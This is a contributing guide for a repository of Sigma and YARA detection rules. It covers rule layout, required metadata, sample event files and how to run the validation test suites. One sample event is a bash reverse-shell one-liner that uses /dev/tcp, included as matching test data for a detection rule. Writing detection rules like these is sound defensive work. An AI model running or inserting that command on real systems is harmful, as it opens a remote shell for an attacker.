# Contributing to Synthaea Rules

This guide covers detection content: how rules are laid out, what each one needs, and how to
validate a change before opening a pull request. The
[organization contributing guide](https://github.com/synthaea-lab/.github/blob/main/CONTRIBUTING.md)
applies as well, including the Developer Certificate of Origin sign-off on every commit
(`git commit -s`).

Adversary-emulation content written to test detections is welcome. Offensive tooling is not.

## Sigma rules

Rules live in `sigma/<platform>/` with a descriptive file name and no platform prefix, for
example `sigma/linux/reverse_shell.yml`. The directory decides where a rule runs: Linux hosts
load `linux/`, Windows hosts `windows/`, macOS hosts `macos/` and `linux/`. A rule outside
these three directories runs nowhere.

Each rule must:

- stay within the
  [supported Sigma subset](https://github.com/synthaea-lab/agent/blob/main/docs/detection/sigma.md#supported-subset):
  the fields `Image`, `CommandLine` and `ParentImage` (plus the PE version fields in
  `windows/` rules), the `contains`, `startswith` and `endswith` modifiers with optional
  `|all`, and the documented condition grammar;
- set `level`, a non-empty `falsepositives` and at least one `attack.tNNNN[.NNN]` tag;
- ship a `<rule>.samples.json` beside it with one `matching` and one `non_matching` event.

A sample event has `image` and `cmdline`, `parentimage` when the rule keys on `ParentImage`,
and an optional `note`. Make the non-matching event a near miss that probes the rule's
boundary, and say which boundary in its `note`:

```json
{
  "matching": {
    "image": "/bin/bash",
    "cmdline": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
  },
  "non_matching": {
    "image": "/usr/bin/nc",
    "cmdline": "nc -zv host 22",
    "note": "Near miss: nc used to scan/connect, not to spawn a shell; the rule's boundary is the -e exec flag, not the binary itself."
  }
}
```

## YARA rules

Rules live in `yara/<category>/<family-or-technique>.yar`, for example
`yara/webshell/webshell_php_superglobal_exec.yar`. Every rule needs three `meta:` strings, as
described in the
[YARA engine documentation](https://github.com/synthaea-lab/agent/blob/main/docs/detection/yara.md#rule-set-and-metadata):

| Key | Accepted |
| --- | --- |
| `severity` | `low`, `medium`, `high`, `critical` |
| `technique` | `T1234` or `T1234.001` |
| `falsepositives` | non-empty |

One file that fails to compile fails the whole rule set, so every file must compile.

The YARA samples are not stored here: the agent's `crates/yara/tests/content.rs` pairs every
compiled rule identifier with one matching and one non-matching sample, and fails when the
two sets differ. Adding, renaming or removing a YARA rule therefore needs a matching pull
request on [synthaea-lab/agent](https://github.com/synthaea-lab/agent).

## Validating a change

The content suites run the real agent engines over this whole tree. Clone
[synthaea-lab/agent](https://github.com/synthaea-lab/agent) next to this repository, with the
two checkouts named `agent` and `rules`, and run from `agent/`:

```sh
cargo test -p sigma --test content --test platform
cargo test -p yara --test content
```

The toolchain version comes from the agent's `rust-toolchain.toml`. On Linux the agent
repository runs test binaries through `sudo -E` (its `.cargo/config.toml`), so expect a
password prompt.

The suites look for the sibling checkout in the parent directory of `agent/`. To use another
location, set `SYNTHAEA_ROOT` to the directory that holds both checkouts. Without the
`rules` checkout the suites print a `skipped` line and pass; set
`SYNTHAEA_REQUIRE_SIBLINGS=1` to make that a failure instead.

## Pull requests

- One rule, or one closely related group of rules, per pull request.
- Describe what the rule detects, the ATT&CK technique, and the false positives you expect.
- Run the content suites and confirm they pass.
